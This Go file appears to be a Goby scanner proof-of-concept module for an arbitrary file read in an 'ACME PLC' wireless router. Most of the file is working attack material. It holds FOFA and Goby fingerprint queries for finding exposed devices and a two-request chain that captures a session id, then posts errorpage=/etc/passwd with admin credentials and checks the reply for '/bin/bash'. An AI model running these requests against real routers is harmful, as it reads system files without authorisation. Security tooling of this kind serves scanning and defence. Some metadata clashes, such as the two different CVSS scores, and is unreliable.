package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "ACME PLC wireless router source/cgi-bin/webproc file errorpage parameter file reading vulnerability",
    "Description": "<p>ACME PLC wireless router is a widely used high-performance wireless network equipment. It is designed and produced by ACME PLC, aiming to provide fast and stable wireless network connection to meet the network needs of various user scenarios such as home, office, and enterprise. ACME PLC Wireless Router Has Arbitrary File Read Vulnerability</p><p>Attackers can use this vulnerability to read important system files (such as database configuration files, system configuration files), database configuration files, etc., making the website extremely insecure.</p>",
    "Impact": "<p>Attackers can use this vulnerability to read important system files (such as database configuration files, system configuration files), database configuration files, etc., resulting in an extremely insecure state of the website.</p>",
    "Recommendation": "<p>1. There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update: <a href=\"http://www.example.com\">http://www.acme.com/</a></p><p>2. Set access policies and whitelist access through security devices such as firewalls. </p><p>3. If not necessary, prohibit public network access to the system.</p>",
    "Product": "ACME-PLC-Wireless-Router",
    "VulType": [
        "File Read"
    ],
    "Tags": [
        "File Read"
    ],
    "Translation": {
        "CN": {
            "Name": "ACME PLC 无线路由器 source/cgi-bin/webproc 文件 errorpage 参数文件读取漏洞",
            "Product": "ACME-PLC-Wireless-Router",
            "Description": "<p>ACME PLC 无线路由器是一款广泛应用的高性能无线网络设备。它是由ACME PLC公司设计和生产，旨在提供快速、稳定的无线网络连接，以满足家庭、办公室、企业等各种用户场景的网络需求。ACME PLC 无线路由器存在任意文件读取漏洞</p><p>攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。<br></p>",
            "Recommendation": "<p>1、官方暂未修复该漏洞，请用户联系厂商修复漏洞：<a href=\"http://www.example.com\" target=\"_blank\">http://www.acme.com/</a><br></p><p>2、通过防火墙等安全设备设置访问策略，设置白名单访问。</p><p>3、如非必要，禁止公网访问该系统。&nbsp;</p>",
            "Impact": "<p>攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。 <br></p>",
            "VulType": [
                "文件读取"
            ],
            "Tags": [
                "文件读取"
            ]
        },
        "EN": {
            "Name": "ACME PLC wireless router source/cgi-bin/webproc file errorpage parameter file reading vulnerability",
            "Product": "ACME-PLC-Wireless-Router",
            "Description": "<p>ACME PLC wireless router is a widely used high-performance wireless network equipment. It is designed and produced by ACME PLC, aiming to provide fast and stable wireless network connection to meet the network needs of various user scenarios such as home, office, and enterprise. ACME PLC Wireless Router Has Arbitrary File Read Vulnerability</p><p>Attackers can use this vulnerability to read important system files (such as database configuration files, system configuration files), database configuration files, etc., making the website extremely insecure.</p>",
            "Recommendation": "<p>1. There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update:&nbsp;<a href=\"http://www.example.com\" target=\"_blank\">http://www.acme.com/</a></p><p>2. Set access policies and whitelist access through security devices such as firewalls.&nbsp;</p><p>3. If not necessary, prohibit public network access to the system.<br></p>",
            "Impact": "<p>Attackers can use this vulnerability to read important system files (such as database configuration files, system configuration files), database configuration files, etc., resulting in an extremely insecure state of the website.<br></p>",
            "VulType": [
                "File Read"
            ],
            "Tags": [
                "File Read"
            ]
        }
    },
    "FofaQuery": "(body=\"PLC Systems, Inc.\" || title=\"PLC Wireless Router\" || body=\"lang_firmwareLogin\")",
    "GobyQuery": "(body=\"PLC Systems, Inc.\" || title=\"PLC Wireless Router\" || body=\"lang_firmwareLogin\")",
    "Author": "gobysec@gmail.com",
    "Homepage": "http://www.acme.com/",
    "DisclosureDate": "2021-06-02",
    "References": [
        "http://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2016-0193209"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "2",
    "CVSS": "6.5",
    "CVEIDs": [],
    "CNVD": [],
    "CNNVD": [],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/cgi-bin/webproc?getpage=html/index.html&errorpage=html/main.html&var:language=zh_cn&var:menu=setup&var:page=connected&var:retag=1&var:subpage=-",
                "follow_redirect": false,
                "header": {
                    "Upgrade-Insecure-Requests": "1",
                    "User-Agent": "Mozilla/5.0 (Windows NT 9.0; Win64; x64) Chrome/90.0.4430.212 Safari/537.36",
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                    "Accept-Encoding": "gzip, deflate",
                    "Accept-Language": "zh-CN,zh;q=0.9",
                    "Connection": "close"
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$head",
                        "operation": "contains",
                        "value": "sessionid",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "session|lastheader|regex|sessionid=([\\w]+);"
            ]
        },
        {
            "Request": {
                "method": "POST",
                "uri": "/cgi-bin/webproc",
                "follow_redirect": false,
                "header": {
                    "Upgrade-Insecure-Requests": "1",
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/90.0.4430.212 Safari/537.36",
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                    "Accept-Encoding": "gzip, deflate",
                    "Accept-Language": "zh-CN,zh;q=0.9",
                    "Cookie": "sessionid={{{session}}}",
                    "Connection": "close",
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "getpage=html%2Findex.html&errorpage=%2Fetc%2Fpasswd&var%3Amenu=setup&var%3Apage=connected&var%3Asubpage=-&obj-action=auth&%3Ausername=admin&%3Apassword=asdasd&%3Aaction=login&%3Asessionid={{{session}}}"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "/bin/bash",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/cgi-bin/webproc?getpage=html/index.html&errorpage=html/main.html&var:language=zh_cn&var:menu=setup&var:page=connected&var:retag=1&var:subpage=-",
                "follow_redirect": false,
                "header": {
                    "Upgrade-Insecure-Requests": "1",
                    "User-Agent": "Mozilla/5.0 (Windows NT 9.0; Win64; x64) Chrome/90.0.4430.212 Safari/537.36",
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                    "Accept-Encoding": "gzip, deflate",
                    "Accept-Language": "zh-CN,zh;q=0.9",
                    "Connection": "close"
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$head",
                        "operation": "contains",
                        "value": "sessionid",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "session|lastheader|regex|sessionid=([\\w]+);"
            ]
        },
        {
            "Request": {
                "method": "POST",
                "uri": "/cgi-bin/webproc",
                "follow_redirect": false,
                "header": {
                    "Upgrade-Insecure-Requests": "1",
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/90.0.4430.212 Safari/537.36",
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                    "Accept-Encoding": "gzip, deflate",
                    "Accept-Language": "zh-CN,zh;q=0.9",
                    "Cookie": "sessionid={{{session}}}",
                    "Connection": "close",
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "getpage=html%2Findex.html&errorpage=%2Fetc%2Fpasswd&var%3Amenu=setup&var%3Apage=connected&var%3Asubpage=-&obj-action=auth&%3Ausername=admin&%3Apassword=asdasd&%3Aaction=login&%3Asessionid={{{session}}}"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "/bin/bash",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "cmd",
            "type": "input",
            "value": "/etc/passwd",
            "show": ""
        }
    ],
    "ExpTips": {
        "type": "",
        "content": ""
    },
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "CVSSScore": "7.6",
    "PocId": "9687"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}
